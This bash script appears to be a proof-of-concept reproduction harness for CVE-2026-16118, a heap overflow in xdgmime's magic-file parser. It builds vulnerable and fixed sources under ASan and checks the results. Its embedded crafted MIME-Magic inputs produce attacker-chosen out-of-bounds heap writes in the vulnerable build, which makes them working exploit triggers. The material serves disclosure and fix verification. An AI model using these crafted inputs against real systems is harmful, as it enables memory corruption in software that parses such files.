#!/usr/bin/env bash
# xdgmime2shell canonical runner (CVE-2026-16118).
# Compiles the UNMODIFIED src/xdgmimemagic.c (and supporting library files)
# from two pinned xdg/xdgmime commits against public-API and internal-state
# drivers. LITTLE_ENDIAN=1 selects the byte-swap branch that GLib's little-
# endian build config selects; no source file is edited. Loopback only: the
# magic input is a local file, no socket, listener or external system.
set -u
cd "$(dirname "$0")" || exit 1
BASE=$PWD
PASS=0
FAIL=0
ok()  { printf 'PASS %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf 'FAIL %s\n' "$1"; FAIL=$((FAIL+1)); }
sha() { sha256sum "$1" | cut -d' ' -f1; }
pin() {
  name=$1; file=$2; want=$3; got=$(sha "$file")
  if [ "$got" = "$want" ]; then ok "pin $name"; else
    printf '  want %s\n  got  %s\n' "$want" "$got"; bad "pin $name"; fi
}

pin tar-vuln-0305e05c src/vuln.tar.gz 89a376a11797ea0e2629bdfc6803d9344b11ed153e09397900f4740a04a82299
pin tar-fixed-1debecbf src/fixed.tar.gz 8f53c295a76cb96bf296626470323d59ea87bf0b08b1ef653a133c9ff3bc2a67
pin fix-commit-patch src/1debecb.patch 35f7098fbdb7c6b3fcf2f8b747dc9837de035af018d71b84e8c9e027b432cfee
pin public-api-driver poc.c 346647db5535fd1a60d11a3efe8f94fbb9288043b75485b2c733339c13a341a1
pin state-probe-driver probe.c eea76d40027e9b51608a71326e7763ebbac40251bd0a218fbf6193456b1cd531

rm -rf src/vuln src/fixed src/out vuln_asan vuln_plain fixed_asan fixed_plain
mkdir -p src/vuln src/fixed src/out evidence vuln_asan vuln_plain fixed_asan fixed_plain
tar -xzf src/vuln.tar.gz -C src/vuln --strip-components=1
tar -xzf src/fixed.tar.gz -C src/fixed --strip-components=1
V=src/vuln/src/xdgmimemagic.c
F=src/fixed/src/xdgmimemagic.c
pin vulnerable-parser "$V" 862de6927afe39ae51aa138277f764feff2c3b257646354a1aeac9b6fb8f144c
pin fixed-parser "$F" fcb1eafe748d3dc18f7f405d1078c8a32e313d23d2fab86b0f12e609ac2ce742
VLINE=$(grep -n '\*((xdg_uint16_t \*) matchlet->value + i) =' "$V" | cut -d: -f1)
FLINE=$(grep -n '\*((xdg_uint16_t \*) (matchlet->value + i)) =' "$F" | cut -d: -f1)
if [ -n "$VLINE" ] && [ -n "$FLINE" ]; then
  ok "source marker lines vuln=$VLINE fixed=$FLINE"
else bad 'source marker lines'; fi
if grep -q '(xdg_uint16_t \*) (matchlet->value + i)' src/1debecb.patch && \
   grep -q '(xdg_uint32_t \*) (matchlet->mask + i)' src/1debecb.patch; then
  ok 'fix patch hunks'
else bad 'fix patch hunks'; fi

python3 - <<'PY'
h = b'MIME-Magic\x00\n[1:application/x-pwn]\n'
cases = {
    'attack2': h + b'>0=\x00\x04ABCD~2\n',
    'attack4': h + b'>0=\x00\x08ABCDEFGH~4\n',
    'mask':    h + b'>0=\x00\x04ABCD&EFGH~2\n',
    'safe1':   h + b'>0=\x00\x04ABCD~1\n',
}
for name, data in cases.items():
    open('evidence/magic-%s.bin' % name, 'wb').write(data)
PY
pin magic-attack2 evidence/magic-attack2.bin 6601bef7afba2398307d3e8d02d14660b78045854282a06033ce7f5036a924a2
pin magic-attack4 evidence/magic-attack4.bin 5ebc0c988653a20b28d81397bfb3efefd03bade0e96fba68c7b99200c04180a0
pin magic-mask evidence/magic-mask.bin bc95e8a4e68ea7c17a9048ac27f57611973190d049bba3b227954863e55a616a
pin magic-safe1 evidence/magic-safe1.bin b56caf85c2ba2c9733fd374646fa81b70e3fd2a16ca3bd3c3c914d607a239d8f

LIB='xdgmimemagic xdgmimeint xdgmime xdgmimealias xdgmimecache xdgmimeglob xdgmimeicon xdgmimeparent'
for CC in gcc clang; do
  "$CC" --version | head -1 > "evidence/$CC-version.log"
  for PIN in vuln fixed; do
    D=src/$PIN/src
    CF="-std=c99 -g -fno-omit-frame-pointer -D_POSIX_C_SOURCE=200809L -DXDG_PREFIX=xdg_test -DHAVE_MMAP -DLITTLE_ENDIAN=1 -I$D"
    for MODE in asan plain; do
      TAG="$PIN-$CC-$MODE"
      if [ "$MODE" = asan ]; then SAN='-fsanitize=address'; REC='-fsanitize-recover=address'; else SAN=''; REC=''; fi
      for f in $LIB; do
        $CC $CF $SAN -c "$D/$f.c" -o "src/out/$TAG-$f.o" || exit 1
      done
      $CC $CF $SAN -c poc.c -o "src/out/$TAG-poc.o" || exit 1
      $CC $CF $SAN $REC -c probe.c -o "src/out/$TAG-probe.o" || exit 1
      OBJS=""
      for f in $LIB; do OBJS="$OBJS src/out/$TAG-$f.o"; done
      $CC $SAN "src/out/$TAG-poc.o" $OBJS -o "${PIN}_${MODE}/poc-$CC" || exit 1
      PROBEOBJS=""
      for f in $LIB; do [ "$f" = xdgmimemagic ] || PROBEOBJS="$PROBEOBJS src/out/$TAG-$f.o"; done
      $CC $SAN "src/out/$TAG-probe.o" $PROBEOBJS -o "${PIN}_${MODE}/probe-$CC" || exit 1
    done
  done
  ok "$CC builds (vuln+fixed, asan+plain)"

  VAS="vuln_asan/poc-$CC"; VPROBE="vuln_asan/probe-$CC"
  FAS="fixed_asan/poc-$CC"; FPROBE="fixed_asan/probe-$CC"
  VPLAIN="vuln_plain/probe-$CC"; FPLAIN="fixed_plain/probe-$CC"
  L="evidence/$CC"; mkdir -p "$L"

  ASAN_OPTIONS=abort_on_error=1:halt_on_error=1 "$VAS" evidence/magic-attack2.bin > "$L/vuln-asan-attack2.log" 2>&1
  rc=$?
  log="$L/vuln-asan-attack2.log"
  if [ "$rc" -ne 0 ] && grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$log" && \
     grep -q 'WRITE of size 2' "$log" && grep -q "xdgmimemagic.c:$VLINE" "$log" && \
     grep -q '0 bytes after 4-byte region' "$log"; then
    ok "$CC vuln asan attack2 WRITE-2 at pinned line after 4-byte region"
  else bad "$CC vuln asan attack2 report"; fi

  ASAN_OPTIONS=abort_on_error=1:halt_on_error=1 "$VAS" evidence/magic-attack4.bin > "$L/vuln-asan-attack4.log" 2>&1
  log="$L/vuln-asan-attack4.log"
  if grep -q 'WRITE of size 4' "$log" && grep -q '8 bytes after 8-byte region' "$log"; then
    ok "$CC vuln asan attack4 WRITE-4 8 bytes after 8-byte region"
  else bad "$CC vuln asan attack4 report"; fi

  ASAN_OPTIONS=abort_on_error=1:halt_on_error=1 "$VAS" evidence/magic-mask.bin > "$L/vuln-asan-mask.log" 2>&1
  log="$L/vuln-asan-mask.log"
  if grep -q 'WRITE of size 2' "$log" && grep -q '0 bytes after 4-byte region' "$log" && \
     grep -q "xdgmimemagic.c:$VLINE" "$log"; then
    ok "$CC vuln asan mask report first OOB write"
  else bad "$CC vuln asan mask report"; fi

  ASAN_OPTIONS=halt_on_error=0:abort_on_error=0 "$VPROBE" evidence/magic-attack2.bin > "$L/vuln-asan-probe-attack2.log" 2>&1
  log="$L/vuln-asan-probe-attack2.log"
  if grep -q 'WRITE of size 2' "$log" && \
     grep -q 'value\[0..19\] (no_sanitize readback): 42 41 43 44 44 43 ' "$log"; then
    ok "$CC vuln probe attack2 chosen 43 44 written as 44 43 at offsets 4/5"
  else bad "$CC vuln probe attack2 chosen-byte readback"; fi

  ASAN_OPTIONS=halt_on_error=0:abort_on_error=0 "$VPROBE" evidence/magic-attack4.bin > "$L/vuln-asan-probe-attack4.log" 2>&1
  log="$L/vuln-asan-probe-attack4.log"
  if grep -q 'WRITE of size 4' "$log" && \
     grep -q '44 43 42 41 45 46 47 48 00 00 00 00 00 00 00 00 48 47 ' "$log"; then
    ok "$CC vuln probe attack4 OOB word at offsets 16/17"
  else bad "$CC vuln probe attack4 chosen-byte readback"; fi

  log="$L/vuln-asan-probe-mask.log"
  ASAN_OPTIONS=halt_on_error=0:abort_on_error=0 "$VPROBE" evidence/magic-mask.bin > "$L/vuln-asan-probe-mask.log" 2>&1
  if grep -q 'mask\[0..19\] (no_sanitize readback): 46 45 47 48 48 47 ' "$log"; then
    ok "$CC vuln probe mask chosen 47 48 written as 48 47 at offsets 4/5"
  else bad "$CC vuln probe mask chosen-byte readback"; fi
  if [ "$(grep -c 'WRITE of size 2' "$log")" -ge 2 ] && \
     [ "$(grep -c '0 bytes after 4-byte region' "$log")" -ge 2 ]; then
    ok "$CC vuln probe mask two OOB writes (value and mask)"
  else bad "$CC vuln probe mask two-write report"; fi

  ASAN_OPTIONS=halt_on_error=0:abort_on_error=0 "$FAS" evidence/magic-attack2.bin > "$L/fixed-asan-attack2.log" 2>&1
  log="$L/fixed-asan-attack2.log"
  if ! grep -q 'ERROR: AddressSanitizer' "$log" && grep -q 'extents=5' "$log"; then
    ok "$CC fixed asan attack2 clean and matchlet parsed"
  else bad "$CC fixed asan attack2 control"; fi

  ASAN_OPTIONS=halt_on_error=0:abort_on_error=0 "$FPROBE" evidence/magic-attack2.bin > "$L/fixed-asan-probe-attack2.log" 2>&1
  log="$L/fixed-asan-probe-attack2.log"
  if ! grep -q 'ERROR: AddressSanitizer' "$log" && \
     grep -q 'value\[0..19\] (no_sanitize readback): 42 41 44 43 00 00 00 00 ' "$log"; then
    ok "$CC fixed probe attack2 swapped in-bounds, no OOB bytes"
  else bad "$CC fixed probe attack2 control"; fi

  ASAN_OPTIONS=abort_on_error=1:halt_on_error=1 "$VAS" evidence/magic-safe1.bin > "$L/vuln-asan-safe1.log" 2>&1
  log="$L/vuln-asan-safe1.log"
  if ! grep -q 'ERROR: AddressSanitizer' "$log" && grep -q 'extents=5' "$log"; then
    ok "$CC vuln asan safe word_size=1 clean"
  else bad "$CC vuln asan safe control"; fi

  "$VPLAIN" evidence/magic-attack2.bin > "$L/vuln-plain-probe-attack2.log" 2>&1
  if grep -q 'value\[0..19\] (no_sanitize readback): 42 41 43 44 44 43 ' "$L/vuln-plain-probe-attack2.log"; then
    ok "$CC vuln plain build shows OOB bytes"
  else bad "$CC vuln plain build readback"; fi

  "$FPLAIN" evidence/magic-attack2.bin > "$L/fixed-plain-probe-attack2.log" 2>&1
  if grep -q 'value\[0..19\] (no_sanitize readback): 42 41 44 43 00 00 00 00 ' "$L/fixed-plain-probe-attack2.log"; then
    ok "$CC fixed plain build no OOB bytes"
  else bad "$CC fixed plain build readback"; fi
done

printf 'RESULT PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
